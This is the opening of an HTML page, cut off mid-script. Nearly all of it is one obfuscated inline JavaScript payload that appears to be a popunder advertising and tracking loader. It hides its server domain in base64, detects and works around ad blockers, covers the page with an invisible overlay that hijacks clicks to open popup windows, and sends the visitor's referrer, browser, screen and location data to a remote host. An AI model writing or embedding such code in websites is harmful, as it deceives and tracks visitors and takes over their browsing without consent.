<!DOCTYPE html>
<html lang="en">
<head>
<script data-cfasync="false" type="text/javascript">(()=>{var K='ChmaorrCfozdgenziMrattShzzyrtarnedpoomrzPteonSitfreidnzgtzcseljibcOezzerlebpalraucgeizfznfoocrzEwaocdhnziaWptpnleytzngoectzzdclriehaCtdenTeepxptaNzoldmetzhRzeegvEoxmpezraztdolbizhXCGtIs=rzicfozn>ceamtazr(fdio/c<u>m"eennto)nz:gyzaclaplslizdl"o=ceallySttso r"akgneazl_bd:attuaozbsae"t=Ictresm zegmeatrIftie<mzzLrMeTmHorveenIntiezmezdcolNeeanrozldcezcdoadeehUzReIdCooNmtpnoenreanptzzebnionndzzybatlopasziedvzaellzyJtSsOzNezmDaartfeizzAtrnreamyuzcPordozmyidsoebzzpeatrasteSIyndtazenrazvtipgiartcoSrtzneenrcroudcezUeRmIazNUgianTty8BAsrtrnaeymzesleEttTeigmzedoIuytBztsneetmIenltEetrevgazlSzNAtrnreamyeBluEfeftearezrcclzetanreTmigmaeroFuttnzecmluecaorDIenttaeerrvcazltznMeevsEshacgteaCphsaindnzelllzABrrootacdeclaesStyCrheaunqnzerloztecnecloedSeyUrReIuCqozmrpeonneetnstizLTtynpeevEErervoormzeErvzernetnzeEtrsrioLrtznIemvaEgdedzaszetsnseimoenlSEteotraaegrec'.split("").reduce((v,g,L)=>L%2?v+g:g+v).split("z");(v=>{let g=[K[0],K[1],K[2],K[3],K[4],K[5],K[6],K[7],K[8],K[9]],L=[K[10],K[11],K[12]],R=document,U,s,c=window,C={};try{try{U=window[K[13]][K[0]](K[14]),U[K[15]][K[16]]=K[17]}catch(a){s=(R[K[10]]?R[K[10]][K[18]]:R[K[12]]||R[K[19]])[K[20]](),s[K[21]]=K[22],U=s[K[23]]}U[K[24]]=()=>{},R[K[9]](K[25])[0][K[26]](U),c=U[K[27]];let _={};_[K[28]]=!1,c[K[29]][K[30]](c[K[31]],K[32],_);let S=c[K[33]][K[34]]()[K[35]](36)[K[36]](2)[K[37]](/^\d+/,K[38]);window[S]=document,g[K[39]](a=>{document[a]=function(){return c[K[13]][a][K[40]](window[K[13]],arguments)}}),L[K[39]](a=>{let h={};h[K[28]]=!1,h[K[41]]=()=>R[a],c[K[29]][K[30]](C,a,h)}),document[K[42]]=function(){let a=new c[K[43]](c[K[44]](K[45])[K[46]](K[47],c[K[44]](K[45])),K[48]);return arguments[0]=arguments[0][K[37]](a,S),c[K[13]][K[42]][K[49]](window[K[13]],arguments[0])};try{window[K[50]]=window[K[50]]}catch(a){let h={};h[K[51]]={},h[K[52]]=(B,ve)=>(h[K[51]][B]=c[K[31]](ve),h[K[51]][B]),h[K[53]]=B=>{if(B in h[K[51]])return h[K[51]][B]},h[K[54]]=B=>(delete h[K[51]][B],!0),h[K[55]]=()=>(h[K[51]]={},!0),delete window[K[50]],window[K[50]]=h}try{window[K[44]]}catch(a){delete window[K[44]],window[K[44]]=c[K[44]]}try{window[K[56]]}catch(a){delete window[K[56]],window[K[56]]=c[K[56]]}try{window[K[43]]}catch(a){delete window[K[43]],window[K[43]]=c[K[43]]}for(key in document)try{C[key]=document[key][K[57]](document)}catch(a){C[key]=document[key]}}catch(_){}let z=_=>{try{return c[_]}catch(S){try{return window[_]}catch(a){return null}}};[K[31],K[44],K[58],K[59],K[60],K[61],K[33],K[62],K[43],K[63],K[63],K[64],K[65],K[66],K[67],K[68],K[69],K[70],K[71],K[72],K[73],K[74],K[56],K[75],K[29],K[76],K[77],K[78],K[79],K[50],K[80]][K[39]](_=>{try{if(!window[_])throw new c[K[78]](K[38])}catch(S){try{let a={};a[K[28]]=!1,a[K[41]]=()=>c[_],c[K[29]][K[30]](window,_,a)}catch(a){}}}),v(z(K[31]),z(K[44]),z(K[58]),z(K[59]),z(K[60]),z(K[61]),z(K[33]),z(K[62]),z(K[43]),z(K[63]),z(K[63]),z(K[64]),z(K[65]),z(K[66]),z(K[67]),z(K[68]),z(K[69]),z(K[70]),z(K[71]),z(K[72]),z(K[73]),z(K[74]),z(K[56]),z(K[75]),z(K[29]),z(K[76]),z(K[77]),z(K[78]),z(K[79]),z(K[50]),z(K[80]),C)})((v,g,L,R,U,s,c,C,z,_,S,a,h,B,ve,N,fe,rt,cn,H,lK,zn,Kt,ft,ue,yK,ut,I,ot,j,an,qt)=>{(function(e,q,i,w){(()=>{function ie(n){let t=n[e.IK]()[e.Aj](e.J);return t>=e.HK&&t<=e.rj?t-e.HK:t>=e.ej&&t<=e.tj?t-e.ej+e.LK:e.J}function bn(n){return n<=e.nK?v[e.Kj](n+e.HK):n<=e.jj?v[e.Kj](n+e.ej-e.LK):e.uK}function Mt(n,t){return n[e.Pk](e.h)[e.NK]((r,f)=>{let u=(t+e.U)*(f+e.U),o=(ie(r)+u)%e.lK;return bn(o)})[e.EK](e.h)}function _e(n,t){return n[e.Pk](e.h)[e.NK]((r,f)=>{let u=t[f%(t[e.SK]-e.U)],o=ie(u),M=ie(r)-o,d=M<e.J?M+e.lK:M;return bn(d)})[e.EK](e.h)}var dt=S,O=dt,it=e.yj(e.rK,e.KK),ct=e.yj(e.jK,e.KK),zt=e.V,at=[[e.kj],[e.Mj,e.bj,e.Ej],[e.Yj,e.Sj],[e.gj,e.Cj,e.Gj],[e.hj,e.vj]],bt=[[e.Oj],[-e.Lj],[-e.Nj],[-e.Fj,-e.qj],[e.Wj,e.Ej,-e.Oj,-e.Rj]],jt=[[e.cj],[e.pj],[e.Bj],[e.Qj],[e.Vj]];function Ce(n,t){try{let r=n[e.FK](f=>f[e.LM](t)>-e.U)[e.vM]();return n[e.LM](r)+zt}catch(r){return e.J}}function mt(n){return it[e.hK](n)?e.i:ct[e.hK](n)?e.V:e.U}function Et(n){return Ce(at,n)}function lt(n){return Ce(bt,n[e.mj]())}function yt(n){return Ce(jt,n)}function pt(n){return n[e.Pk](e.iK)[e.kK](e.U)[e.FK](t=>t)[e.vM]()[e.Pk](e.DK)[e.kK](-e.V)[e.EK](e.DK)[e.eM]()[e.Pk](e.h)[e.sK]((t,r)=>t+ie(r),e.J)%e.w+e.U}var Be=[];function xt(){return Be}function X(n){Be[e.kK](-e.U)[e.oj]()!==n&&Be[e.Hj](n)}var oe=typeof i<e.l?i[e.qr]:e.v,Ne=e.H,Te=e.n,ce=c[e.A]()[e.IK](e.lK)[e.kK](e.V),st=c[e.A]()[e.IK](e.lK)[e.kK](e.V),Fe=c[e.A]()[e.IK](e.lK)[e.kK](e.V),pK=c[e.A]()[e.IK](e.lK)[e.kK](e.V);function jn(n){oe[e.zK](Ne,jn),[mt(w[e.fr]),Et(q[e.uj][e.JK]),lt(new s),pt(q[e.nj][e.xb]),yt(w[e.yb]||w[e.Lb])][e.X](t=>{let r=a(c[e.A]()*e.LK,e.LK);N(()=>{let f=e.MK();f[e.aK]=n[e.XK],f[e.ob]=t,q[e.PK](f,e.fK),X(e.LE[e.CK](t))},r)})}function mn(n){oe[e.zK](Te,mn);let t=e.MK();t[e.aK]=n[e.XK];let{href:r}=q[e.nj],f=new q[e.Tj];f[e.Pj](e.gr,r),f[e.fj]=()=>{t[e.Nr]=f[e.bE](),q[e.PK](t,e.fK)},f[e.Rr]=()=>{t[e.Nr]=e.Fb,q[e.PK](t,e.fK)},f[e.xk]()}oe&&(oe[e.T](Ne,jn),oe[e.T](Te,mn));var ht=e.u,wt=e.z,V=e.a,ze=i[e.qr],T=[q],Jt=[],gt=()=>{};ze&&ze[e.Rr]&&(gt=ze[e.Rr]);try{let n=T[e.kK](-e.U)[e.oj]();for(;n&&n!==n[e.rk]&&n[e.rk][e.uj][e.JK];)T[e.Hj](n[e.rk]),n=n[e.rk]}catch(n){}T[e.X](n=>{n[e.Ub][e.PM][e.NM][e.aM]||(n[e.Ub][e.PM][e.NM][e.aM]=c[e.A]()[e.IK](e.lK)[e.kK](e.V));let t=n[e.Ub][e.PM][e.NM][e.aM];n[t]=n[t]||[];try{n[V]=n[V]||[]}catch(r){}});function Ut(n,t,r,f=e.J,u=e.J,o){let M;try{M=ze[e.Ek][e.Pk](e.iK)[e.V]}catch(d){}try{let d=q[e.Ub][e.PM][e.NM][e.aM]||V,b=q[d][e.FK](l=>l[e.Kk]===r&&l[e.bb])[e.vM](),p=e.MK();p[e.jk]=n,p[e.Mb]=t,p[e.Kk]=r,p[e.bb]=b?b[e.bb]:u,p[e.Eb]=M,p[e.Yb]=f,p[e.Sb]=o,o&&o[e.db]&&(p[e.db]=o[e.db]),Jt[e.Hj](p),T[e.X](l=>{let J=l[e.Ub][e.PM][e.NM][e.aM]||V;l[J][e.Hj](p);try{l[V][e.Hj](p)}catch(E){}})}catch(d){}}function Ae(n,t){let r=Pt();for(let f=e.J;f<r[e.SK];f++)if(r[f][e.Kk]===t&&r[f][e.jk]===n)return!e.J;return!e.U}function Pt(){let n=[];for(let t=e.J;t<T[e.SK];t++){let r=T[t][e.Ub][e.PM][e.NM][e.aM],f=T[t][r]||[];for(let u=e.J;u<f[e.SK];u++)n[e.FK](({format:o,zoneId:M})=>{let d=o===f[u][e.jk],b=M===f[u][e.Kk];return d&&b})[e.SK]>e.J||n[e.Hj](f[u])}try{for(let t=e.J;t<T[e.SK];t++){let r=T[t][V]||[];for(let f=e.J;f<r[e.SK];f++)n[e.FK](({format:u,zoneId:o})=>{let M=u===r[f][e.jk],d=o===r[f][e.Kk];return M&&d})[e.SK]>e.J||n[e.Hj](r[f])}}catch(t){}return n}function En(n,t){T[e.NK](r=>{let f=r[e.Ub][e.PM][e.NM][e.aM]||V;return(r[f]||[])[e.FK](u=>n[e.LM](u[e.Kk])>-e.U)})[e.sK]((r,f)=>r[e.CK](f),[])[e.X](r=>{try{r[e.Sb][e.ek](t)}catch(f){}})}var Y=e.MK();Y[e.U]=e.x,Y[e.d]=e.r,Y[e.Z]=e.K,Y[e.i]=e.j,Y[e.w]=e.k,Y[e.I]=e.M,Y[e.V]=e.b;var W=e.MK();W[e.U]=e.E,W[e.I]=e.Y,W[e.i]=e.S,W[e.V]=e.b;var k=e.MK();k[e.U]=e.g,k[e.V]=e.C,k[e.d]=e.G,k[e.Z]=e.G,k[e.i]=e.G;var m=10075524,F=10075523,xK=360,vt=1,_t=10,Ct=3,sK=true,hK=U[e.bK](g('eyJhZGJsb2NrIjp7fSwiZXhjbHVkZXMiOiIifQ==')),A=1,ln='Ly94N2kwLmNvbS81LzEwMDc1NTI0',yn='eDdpMC5jb20=',Bt=2,Nt=1761082697*e.mr,Tt='Zez$#t^*EFng',Ft='vf8',At='81fiauya6aq',pn='dre55urn9ecn9b',xn='bdj',sn='nxnd77w5ok3',Lt='_qrjdusbc',Xt='_qvjlasax',Zt=false,x=e.MK(),Dt=e.XM[e.Pk](e.h)[e.zj]()[e.EK](e.h);typeof q<e.l&&(x[e.UK]=q,typeof q[e.uj]<e.l&&(x[e.aj]=q[e.uj])),typeof i<e.l&&(x[e.dK]=i,x[e.ZK]=i[Dt]),typeof w<e.l&&(x[e.or]=w);function hn(){let{doc:n}=x;try{x[e.pK]=n[e.pK]}catch(t){let r=[][e.eb][e.Sk](n[e.qb](e.kk),f=>f[e.Ek]===e.Jj);x[e.pK]=r&&r[e.Zb][e.pK]}}hn(),x[e.s]=()=>{if(!q[e.rk])return e.v;try{let n=q[e.rk][e.Ub],t=n[e.pK](e.zM);return n[e.ib][e.Yk](t),t[e.JM]!==n[e.ib]?!e.U:(t[e.JM][e.gk](t),x[e.UK]=q[e.rk],x[e.dK]=x[e.UK][e.Ub],hn(),!e.J)}catch(n){return!e.U}},x[e.D]=()=>{try{return x[e.dK][e.qr][e.JM]!==x[e.dK][e.ib]?(x[e.Rb]=x[e.dK][e.qr][e.JM],(!x[e.Rb][e.xK][e.iM]||x[e.Rb][e.xK][e.iM]===e.Zk)&&(x[e.Rb][e.xK][e.iM]=e.mb),!e.J):!e.U}catch(n){return!e.U}};var ae=x;function Rt(n,t,r){let f=ae[e.dK][e.pK](e.kk);f[e.xK][e.Mk]=e.Xj,f[e.xK][e.JK]=e.Xj,f[e.xK][e.bk]=e.J,f[e.Ek]=e.Jj,(ae[e.dK][e.BM]||ae[e.ZK])[e.Yk](f);let u=f[e.FM][e.Pj][e.Sk](ae[e.UK],n,t,r);return f[e.JM][e.gk](f),u}var be,Yt=[];function Qt(){let n=[e.Ck,e.Gk,e.hk,e.vk,e.Ok,e.Wk,e.ck,e.pk],t=[e.uK,e.Bk,e.Qk,e.Vk,e.Hk],r=[e.nk,e.uk,e.zk,e.ak,e.Xk,e.Jk,e.Uk,e.dk,e.Zk,e.ik,e.wk,e.Ik],f=c[e.lk](c[e.A]()*n[e.SK]),u=n[f][e.sk](e.yj(e.Ck,e.qM),()=>{let o=c[e.lk](c[e.A]()*r[e.SK]);return r[o]})[e.sk](e.yj(e.Gk,e.qM),()=>{let o=c[e.lk](c[e.A]()*t[e.SK]),M=t[o],d=c[e.EE](e.LK,M[e.SK]),b=c[e.lk](c[e.A]()*d);return e.h[e.CK](M)[e.CK](b)[e.kK](M[e.SK]*-e.U)});return e.Dk[e.CK](be,e.iK)[e.CK](u,e.iK)}function Ht(){return e.h[e.CK](Qt()[e.kK](e.J,-e.U),e.wK)}function Ot(n){return n[e.Pk](e.iK)[e.kK](e.i)[e.EK](e.iK)[e.Pk](e.h)[e.sK]((t,r,f)=>{let u=c[e.EE](f+e.U,e.I);return t+r[e.Aj](e.J)*u},e.Ak)[e.IK](e.lK)}function Vt(){let n=i[e.pK](e.kk);return n[e.xK][e.Mk]=e.Xj,n[e.xK][e.JK]=e.Xj,n[e.xK][e.bk]=e.J,n}function wn(n){n&&(be=n,Gt())}function Gt(){be&&Yt[e.X](n=>n(be))}function St(n){try{let t=i[e.pK](e.cr);t[e.aK]=e.RM,(i[e.BM]||i[e.PM])[e.Yk](t),N(()=>{try{n(getComputedStyle(t,e.v)[e.wE]!==e.XE)}catch(r){n(!e.J)}},e.ok)}catch(t){n(!e.J)}}function It(){let n=Bt===e.U?e.Uj:e.dj,t=e.mM[e.CK](n,e.oM)[e.CK](Y[A]),r=e.MK();r[e.ek]=wn,r[e.tk]=xt,r[e.yk]=sn,r[e.Lk]=pn,r[e.Nk]=xn,Ut(t,ht,m,Nt,F,r)}function Jn(){let n=W[A];return Ae(n,F)||Ae(n,m)}function gn(){let n=W[A];return Ae(n,F)}function Wt(){let n=[e.Fk,e.qk,e.Rk,e.mk],t=i[e.pK](e.kk);t[e.xK][e.bk]=e.J,t[e.xK][e.JK]=e.Xj,t[e.xK][e.Mk]=e.Xj,t[e.Ek]=e.Jj;try{i[e.PM][e.Yk](t),n[e.X](r=>{try{q[r]}catch(f){delete q[r],q[r]=t[e.FM][r]}}),i[e.PM][e.gk](t)}catch(r){}}var Le=e.MK(),je=e.MK(),Xe=e.MK(),$t=e.U,ee=e.h,me=e.h;Ze();function Ze(){if(ee)return;let n=fe(()=>{if(gn()){H(n);return}if(me){try{let t=me[e.Pk](le)[e.FK](M=>!le[e.hK](M)),[r,f,u]=t;me=e.h,Xe[e.o]=f,Le[e.o]=r,je[e.o]=Nn(u,e.Tr),[Le,je,Xe][e.X](M=>{ye(M,st,$t)});let o=[_e(Le[e.t],je[e.t]),_e(Xe[e.t],je[e.t])][e.EK](e.DK);ee!==o&&(ee=o,En([m,F],ee))}catch(t){}H(n)}},e.ok)}function Un(){return ee}function kt(){ee=e.h}function Ee(n){n&&(me=n)}var y=e.MK();y[e.A]=e.h,y[e.e]=e.h,y[e.t]=e.h,y[e.y]=void e.J,y[e.L]=e.v,y[e.N]=_e(Ft,At);var Pn=new s,vn=!e.U;_n();function _n(){y[e.y]=!e.U,Pn=new s;let n=Mr(y,Fe),t=fe(()=>{if(y[e.t]!==e.h){if(H(t),q[e.zK](e.P,n),y[e.t]===e.Fb){y[e.y]=!e.J;return}try{if(C(y[e.e])[e.NE](e.J)[e.X](f=>{y[e.A]=e.h;let u=Cn(e.KY,e.uE);C(u)[e.NE](e.J)[e.X](o=>{y[e.A]+=v[e.Kj](Cn(e.ej,e.tj))})}),gn())return;let r=e.IE*e.Lj*e.mr;N(()=>{if(vn)return;let f=new s()[e.xM]()-Pn[e.xM]();y[e.L]+=f,_n(),Ze(),hr()},r)}catch(r){}y[e.y]=!e.J,y[e.t]=e.h}},e.ok);q[e.T](e.P,n)}function er(){return y[e.t]=y[e.t]*e.UM%e.Tk,y[e.t]}function Cn(n,t){return n+er()%(t-n)}function nr(n){return n[e.Pk](e.h)[e.sK]((t,r)=>(t<<e.Z)-t+r[e.Aj](e.J)&e.Tk,e.J)}function tr(){return[y[e.A],y[e.N]][e.EK](e.DK)}function De(){let n=[...e.dM],t=(c[e.A]()*e.ZM|e.J)+e.d;return[...C(t)][e.NK](r=>n[c[e.A]()*n[e.SK]|e.J])[e.EK](e.h)}function Re(){return y[e.y]}function rr(){vn=!e.J}var le=e.yj(e.YK,e.h),Kr=typeof i<e.l?i[e.qr]:e.v,fr=e.F,ur=e.q,or=e.R,qr=e.m;function ye(n,t,r){let f=n[e.o][e.Pk](le)[e.FK](o=>!le[e.hK](o)),u=e.J;return n[e.t]=f[u],n[e.SK]=f[e.SK],o=>{let M=o&&o[e.tM]&&o[e.tM][e.aK],d=o&&o[e.tM]&&o[e.tM][e.ob];if(M===t)for(;d--;)u+=r,u=u>=f[e.SK]?e.J:u,n[e.t]=f[u]}}function Mr(n,t){return r=>{let f=r&&r[e.tM]&&r[e.tM][e.aK],u=r&&r[e.tM]&&r[e.tM][e.Nr];if(f===t)try{let o=(n[e.L]?new s(n[e.L])[e.IK]():u[e.Pk](fr)[e.eb](p=>p[e.DM](e.FE)))[e.Pk](ur)[e.oj](),M=new s(o)[e.cE]()[e.Pk](or),d=M[e.vM](),b=M[e.vM]()[e.Pk](qr)[e.vM]();n[e.e]=a(b/Ct,e.LK)+e.U,n[e.L]=n[e.L]?n[e.L]:new s(o)[e.xM](),n[e.t]=nr(d+Tt)}catch(o){n[e.t]=e.Fb}}}function Bn(n,t){let r=new ut(t);r[e.XK]=n,Kr[e.fk](r)}function Nn(n,t){return C[e.TM](e.v,e.MK(e.SK,t))[e.NK]((r,f)=>Mt(n,f))[e.EK](e.AK)}var Tn=e.U,Ye=e.MK(),Fn=e.MK(),An=e.MK();Ye[e.o]=pn,q[e.T](e.P,ye(Ye,ce,Tn));var dr=Ye[e.SK]*e.Tr;Fn[e.o]=Nn(sn,dr),An[e.o]=xn,q[e.T](e.P,ye(Fn,ce,e.Tr)),q[e.T](e.P,ye(An,ce,Tn));var Ln=e.f,pe=e.xr,ir=e.W,cr=e.l;function Xn(n){let t=a(n,e.LK)[e.IK](e.lK),r=[Ln,t][e.EK](cr),f=[Ln,t][e.EK](ir);return[r,f]}function zr(n,t){let[r,f]=Xn(n);j[r]=e.J,j[f]=t}function ar(n){let[t,r]=Xn(n),f=a(j[t],e.LK)||e.J,u=j[r];return f>=e.i?(delete j[t],delete j[r],e.v):u?(j[t]=f+e.U,u):e.v}function br(n){let t=new s()[e.xM]();try{j[pe]=e.h[e.CK](t,e.gb)[e.CK](n)}catch(r){}}function jr(){try{if(!j[pe])return e.h;let[n,t]=j[pe][e.Pk](e.gb);return a(n,e.LK)+e.Zj<new s()[e.xM]()?(delete j[pe],e.h):t}catch(n){return e.h}}var mr=e.rr,Er=e.Kr,Qe=e.jr,lr=e.kr,Zn=e.Mr,He=e.br,xe=e.Er,se=e.Yr,Dn=e.Sr,yr=e.gr,pr=e.Cr,xr=e.Gr,Oe=e.hr,Rn=e.vr,he=!e.U;function sr(){return e.eK[e.CK](m,e.tK)}function ne(){return Un()}function hr(){let n=e.MK(),t=fe(()=>{Re()&&(H(t),Ve())},e.ok);n[e.aK]=Fe,q[e.PK](n,e.fK)}function Ve(n){let t=new q[e.Tj];t[e.Pj](yr,e.Dk[e.CK](tr())),n&&t[e.rM](Qe,lr),t[e.rM](xr,k[A]),t[e.fj]=()=>{if(t[e.lb]===e.wb){let r=t[e.bE]()[e.VE]()[e.Pk](e.yj(e.HE,e.h)),f=e.MK();r[e.X](u=>{let o=u[e.Pk](e.oE),M=o[e.vM]()[e.eM](),d=o[e.EK](e.oE);f[M]=d}),f[Oe]?(he=!e.J,Ee(f[Oe]),n&&br(f[Oe])):f[Rn]&&Ee(f[Rn]),n||Ze()}},t[e.Rr]=()=>{n&&(he=!e.J,Ee(e.YE))},kt(),t[e.xk]()}function Yn(n){return new O((t,r)=>{let f=new s()[e.xM](),u=fe(()=>{let o=Un();o?(H(u),o===e.tE&&r(new I(e.tr)),he&&(n||rr(),t(o)),t()):f+e.lE<new s()[e.xM]()&&(H(u),r(new I(e.TE)))},e.ok)})}function wr(){let n=jr();if(n)he=!e.J,Ee(n);else{let t=fe(()=>{Re()&&(H(t),Ve(!e.J))},e.ok)}}var Qn=e.Or,wK=e.gK[e.CK](m,e.GK),Ge=e.Wr,JK=vt*e.Pr,gK=_t*e.mr;q[Ge]||(q[Ge]=e.MK());function Jr(n){try{let t=e.h[e.CK](Qn)[e.CK](n),r=an[t]||j[t];if(r)return new s()[e.xM]()>a(r,e.LK)}catch(t){}return!e.J}function Hn(n){let t=new s()[e.xM]()+e.Zj,r=e.h[e.CK](Qn)[e.CK](n);q[Ge][n]=!e.J;try{j[r]=t}catch(f){}try{an[r]=t}catch(f){}}var Q=w[e.fr],gr=Q[e.yK](e.yj(e.KM,e.h))||[],Ur=Q[e.yK](e.yj(e.jM,e.h))||[],On=a(gr[e.U],e.LK)||a(Ur[e.U],e.LK),we=e.yj(e.ij,e.h)[e.hK](Q),Pr=e.yj(e.rK,e.KK)[e.hK](Q),Vn=we||Pr,vr=e.yj(e.wj,e.h)[e.hK](Q),_r=e.yj(e.Ij,e.lj)[e.hK](Q),Cr=e.yj(e.kM,e.KK)[e.hK](Q)&&e.yj(e.MM,e.KK)[e.hK](Q),P,te,Se=!e.U,Gn=!e.U,Sn=g(yn),Br=[e.vK,e.H,e.OK,e.WK,e.cK];function Nr(n,t){let r=!Cr&&On<e.bM;n[e.T]?(we||(On&&!Vn?n[e.T](e.vK,t,!e.J):(_r||vr)&&!Vn?n[e.T](e.H,t,!e.J):(n[e.T](e.H,t,!e.J),n[e.T](e.OK,t,!e.J))),r?we?n[e.T](e.WK,t,!e.J):n[e.T](e.cK,t,!e.J):we&&n[e.T](e.H,t,!e.J)):i[e.sj]&&n[e.sj](e.E,t)}function Ie(n){!Jr(n)||Gn||(Gn=n===m,P=i[e.pK](e.cr),P[e.xK][e.iM]=e.EM,P[e.xK][e.rk]=e.J,P[e.xK][e.wM]=e.J,P[e.xK][e.IM]=e.J,P[e.xK][e.lM]=e.J,P[e.xK][e.ur]=e.Tk,P[e.xK][e.sM]=e.YM,te=t=>{if(Se)return;t[e.SE](),t[e.gE](),qe();let r=Rt(e.Dk[e.CK](Sn,e.nE)[e.CK](n,e.pE));r&&n===F?Hn(n):r&&n===m&&N(()=>{r[e.sE]||Hn(n)},e.mr)},Nr(P,te),i[e.PM][e.Yk](P),Se=!e.U)}function qe(){try{Br[e.X](n=>{q[e.zK](n,te,!e.J),q[e.zK](n,te,!e.U)}),P&&i[e.PM][e.gk](P),te=void e.J}catch(n){}Se=!e.J}function We(){return te===void e.J}function In(n){Sn=n}var Tr=e.cr,Wn=i[e.pK](Tr),Fr=e.pr,Ar=e.Br,Lr=e.Qr,Xr=e.Vr,Zr=e.Hr,Dr=e.nr;Wn[e.xK][e.ur]=Fr,Wn[e.xK][e.zr]=Ar;function Rr(n){let t=C[e.KE][e.kK][e.Sk](i[e.Tb])[e.FK](r=>r[e.xb]===n)[e.oj]()[e.Dj];return(t[e.J][e.fM][e.DM](e.AM)?t[e.J][e.xK][e.SM]:t[e.V][e.xK][e.SM])[e.kK](e.U,-e.U)}function $e(n){return Kt(g(n)[e.Pk](e.h)[e.NK](function(t){return e.jE+(e.Bk+t[e.Aj](e.J)[e.IK](e.uE))[e.kK](-e.V)})[e.EK](e.h))}function ke(n){let t=g(n),r=new rt(t[e.SK]);return new ve(r)[e.NK]((f,u)=>t[e.Aj](u))}function Yr(n,t){return new O((r,f)=>{let u=i[e.pK](Lr);u[e.xb]=n,u[e.Pb]=Xr,u[e.pM]=Dr,u[e.fb]=Zr,i[e.ib][e.xE](u,i[e.ib][e.kE]),u[e.fj]=()=>{try{let o=Rr(u[e.xb]);u[e.JM][e.gk](u),r(t===xe?ke(o):$e(o))}catch(o){f()}},u[e.Rr]=()=>{u[e.JM][e.gk](u),f()}})}function Qr(n,t){return new O((r,f)=>{let u=new ot;u[e.fb]=e.tb,u[e.Ek]=n,u[e.fj]=()=>{let o=i[e.pK](e.JE);o[e.Mk]=u[e.Mk],o[e.JK]=u[e.JK];let M=o[e.UE](e.dE);M[e.QE](u,e.J,e.J);let{data:d}=M[e.ZE](e.J,e.J,u[e.Mk],u[e.JK]),b=d[e.kK](e.J,e.zE)[e.FK]((E,Z)=>(Z+e.U)%e.d)[e.zj]()[e.sK]((E,Z,Ke)=>E+Z*c[e.EE](e.PE,Ke),e.J),p=[];for(let E=e.zE;E<d[e.SK];E++)if((E+e.U)%e.d){let Z=d[E];(t===xe||Z>=e.qE)&&p[e.Hj](v[e.Kj](Z))}let l=L(p[e.EK](e.h)[e.yE](e.J,b)),J=t===xe?ke(l):$e(l);return r(J)},u[e.Rr]=()=>f()})}function Hr(n,t,r=He,f=se,u=e.MK()){return new O((o,M)=>{let d=new q[e.Tj];if(d[e.Pj](f,n),d[e.nM]=r,d[e.rE]=!e.J,d[e.rM](mr,L(B(t))),d[e.fj]=()=>{let b=e.MK();b[e.lb]=d[e.lb],b[e.Nr]=r===He?U[e.BE](d[e.Nr]):d[e.Nr],[e.wb,e.RE][e.LM](d[e.lb])>=e.J?o(b):M(new I(e.rY[e.CK](d[e.lb],e.oM)[e.CK](d[e.fE],e.mE)[e.CK](t)))},d[e.Rr]=()=>{M(new I(e.rY[e.CK](d[e.lb],e.oM)[e.CK](d[e.fE],e.mE)[e.CK](t)))},f===Dn){let b=typeof u==e.GE?U[e.BE](u):u;d[e.rM](Qe,Zn),d[e.xk](b)}else d[e.xk]()})}function Or(n,t,r=He,f=se,u=e.MK()){return new O((o,M)=>{let d=Ot(n),b=Vt(),p=!e.U,l,J,E=()=>{try{b[e.JM][e.gk](b),q[e.zK](e.P,Z),p||M(new I(e.xY))}catch(Ke){}};function Z(Ke){let de=ue[e.rb](Ke[e.tM])[e.oj]();if(de===d)if(cn(J),Ke[e.tM][de]===e.v){let D=e.MK();D[de]=e.MK(e.DE,e.AE,e.cM,L(B(t)),e.QM,f,e.BM,typeof u==e.GE?U[e.BE](u):u),f===Dn&&(D[de][e.eE]=U[e.BE](e.MK(e.jr,Zn))),b[e.FM][e.PK](D,e.fK)}else{p=!e.J,E(),cn(l);let D=e.MK(),dn=U[e.bK](g(Ke[e.tM][de]));D[e.lb]=dn[e.iE],D[e.Nr]=r===xe?ke(dn[e.BM]):$e(dn[e.BM]),[e.wb,e.RE][e.LM](D[e.lb])>=e.J?o(D):M(new I(e.rY[e.CK](D[e.lb],e.mE)[e.CK](t)))}}q[e.T](e.P,Z),b[e.Ek]=n,(i[e.BM]||i[e.PM])[e.Yk](b),J=N(E,e.ME),l=N(E,e.Fr)})}function Je(n){try{return n[e.Pk](e.iK)[e.V][e.Pk](e.DK)[e.kK](-e.V)[e.EK](e.DK)[e.eM]()}catch(t){return e.h}}var Me=e.ar,Vr=e.Xr,Gr=e.O,Sr=e.l,Ir=e.Jr,G=e.MK();G[e.Ur]=e.O,G[e.dr]=e.W,G[e.Zr]=e.c,G[e.ir]=e.p,G[e.wr]=e.B,G[e.Ir]=e.Q;function $n(n,t){let r=G[t]||Sr,f=a(n,e.LK)[e.IK](e.lK),u=[Me,f][e.EK](r),o=[Me,f,Vr][e.EK](r),M=[Me,f,Gr][e.EK](r);return[u,o,M]}function Wr(){let n=j[Me];if(n)return n;let t=c[e.A]()[e.IK](e.lK)[e.kK](e.V);return j[Me]=t,t}function $r(n){let t=e.gM[e.CK](ne(),e.CM),r=ue[e.rb](n)[e.NK](u=>{let o=ft(n[u]);return[u,o][e.EK](e.CE)})[e.EK](e.GM),f=new q[e.Tj];f[e.Pj](e.Sr,t,!e.J),f[e.rM](Qe,pr),f[e.xk](r)}function ge(n,t){let[r,f,u]=$n(n,t),o=a(j[u],e.LK)||e.J;j[u]=o+e.U,j[r]=new s()[e.xM](),j[f]=e.h}function Ue(n,t,r){let[f,u,o]=$n(n,t);if(j[f]&&!j[u]){let M=a(j[o],e.LK)||e.J,d=a(j[f],e.LK),b=new s()[e.xM](),p=b-d,{referrer:l}=i,J=q[e.nj][e.xb];j[u]=b,j[o]=e.J;let E=e.MK(e.Cb,n,e.Gb,l,e.hb,p,e.vb,r,e.Ob,b,e.Wb,Wr(),e.cb,J,e.pb,d,e.Bb,M,e.Qb,w[e.fr],e.Vb,q[e.uj][e.Mk],e.Hb,q[e.uj][e.JK],e.QM,t||Ir,e.nb,new s()[e.mj](),e.ub,Je(r),e.zb,Je(l),e.ab,Je(J),e.Xb,w[e.yb]||w[e.Lb]);$r(E)}}var kr=e.yj(e.BK,e.KK),eK=e.yj(e.QK),nK=e.yj(e.VK),tK=e.lr,kn=[tK,m[e.IK](e.lK)][e.EK](e.h),re=e.MK();re[e.W]=oK,re[e.B]=qK,re[e.Q]=nn,re[e.Xr]=et;var rK=[nn,et];function KK(n){return kr[e.hK](n)?n:eK[e.hK](n)?e.hM[e.CK](n):nK[e.hK](n)?e.Dk[e.CK](q[e.nj][e.Ib])[e.CK](n):q[e.nj][e.xb][e.Pk](e.iK)[e.kK](e.J,-e.U)[e.CK](n)[e.EK](e.iK)}function fK(){let n=[j[kn]][e.CK](ue[e.rb](re));return n[e.FK]((t,r)=>t&&n[e.LM](t)===r)}function 